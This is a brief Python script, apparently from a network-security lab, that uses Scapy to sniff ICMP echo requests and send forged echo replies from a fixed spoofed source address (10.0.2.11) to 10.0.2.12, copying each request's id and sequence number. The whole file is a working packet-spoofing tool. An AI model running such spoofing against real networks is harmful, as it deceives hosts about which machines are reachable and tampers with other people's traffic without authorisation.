from scapy.all import *


def spoofing(pkt):
	#pkt.show()
	if pkt[2].type == 8:
		ip = IP(src = '10.0.2.11',dst='10.0.2.12')
		icmp = ICMP(type=0,id=pkt[2].id,seq=pkt[2].seq)
		#pkt = ip/icmp
		send(ip/icmp)

sniff(filter='icmp',prn=spoofing)

